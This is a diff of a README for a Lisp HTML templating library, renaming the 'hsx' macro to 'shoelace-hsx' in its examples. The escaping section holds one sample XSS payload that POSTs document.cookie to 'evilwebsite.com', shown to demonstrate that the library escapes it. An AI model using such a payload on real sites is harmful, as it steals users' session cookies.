@@ -6,11 +6,11 @@
 
 > 🚧 **BETA NOTICE:**  
 > This library is still in early development. APIs may change.  
-> See [release notes](https://github.com/skyizwhite/hsx/releases) for details.
+> See [release notes](https://github.com/skyizwhite/shoelace-hsx/releases) for details.
 
 ## ⚙️ How HSX Works
 
-Every tag or component inside an `(hsx ...)` form is transformed into a Lisp expression of the form:
+Every tag or component inside an `(shoelace-hsx ...)` form is transformed into a Lisp expression of the form:
 
 ```lisp
 (create-element type props children)
@@ -19,7 +19,7 @@ Every tag or component inside an `(hsx ...)` form is transformed into a Lisp exp
 For example:
 
 ```lisp
-(hsx
+(shoelace-hsx
   (article :class "container"
     (h1 "Title")
     (p "Paragraph")
@@ -44,7 +44,7 @@ Is internally transformed (by macro expansion) into:
 ## 🚀 Quick Example
 
 ```lisp
-(hsx
+(shoelace-hsx
   (div :id "main" :class "container"
     (h1 "Hello, HSX!")
     (p "This is a simple paragraph.")))
@@ -65,7 +65,7 @@ Use `render-to-string` to convert an HSX structure to a string of HTML:
 
 ```lisp
 (render-to-string
-  (hsx ...))
+  (shoelace-hsx ...))
 ``` 
 
 ## 🔐 Escaping text
@@ -73,7 +73,7 @@ Use `render-to-string` to convert an HSX structure to a string of HTML:
 All elements automatically escape special characters in content to prevent XSS and HTML injection:
 
 ```lisp
-(hsx
+(shoelace-hsx
   (div "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))
 ```
 Outputs:
@@ -85,7 +85,7 @@ Outputs:
 Use the special tag `raw!` to inject trusted, unescaped HTML:
 
 ```lisp
-(hsx
+(shoelace-hsx
   (article (raw! "HTML text here ..."))
 ```
 
@@ -94,7 +94,7 @@ Use the special tag `raw!` to inject trusted, unescaped HTML:
 Use `<>` tag to group multiple sibling elements without wrapping them in a container tag:
 
 ```lisp
-(hsx
+(shoelace-hsx
   (<>
     (p "One")
     (p "Two")))
@@ -117,7 +117,7 @@ Define reusable components using `defcomp` macro. Component names must start wit
 
 ```lisp
 (defcomp ~card (&key title children)
-  (hsx
+  (shoelace-hsx
     (div :class "card"
       (h2 title)
       children)))
@@ -127,7 +127,7 @@ Define reusable components using `defcomp` macro. Component names must start wit
 
 ```lisp
 (defcomp ~card (&rest props)
-  (hsx
+  (shoelace-hsx
     (div :class "card"
       (h2 (getf props :title))
       (getf props :children))))
@@ -136,7 +136,7 @@ Define reusable components using `defcomp` macro. Component names must start wit
 ### Usage
 
 ```lisp
-(hsx
+(shoelace-hsx
   (~card :title "Hello"
     (p "This is a card.")))
 ```
@@ -155,20 +155,20 @@ Outputs:
 You can freely embed Lisp expressions, conditionals, and loops inside HSX forms:
 
 ```lisp
-(hsx
+(shoelace-hsx
   (div
     (if (> (random 10) 5)
-        (hsx (p "High!"))
-        (hsx (p "Low!")))))
+        (shoelace-hsx (p "High!"))
+        (shoelace-hsx (p "Low!")))))
 ```
 
 Or loop:
 
 ```lisp
-(hsx
+(shoelace-hsx
   (ul
     (loop :for item :in todo-list :collect
-      (hsx (li item))))))
+      (shoelace-hsx (li item))))))
 ```
 
 ## Utils
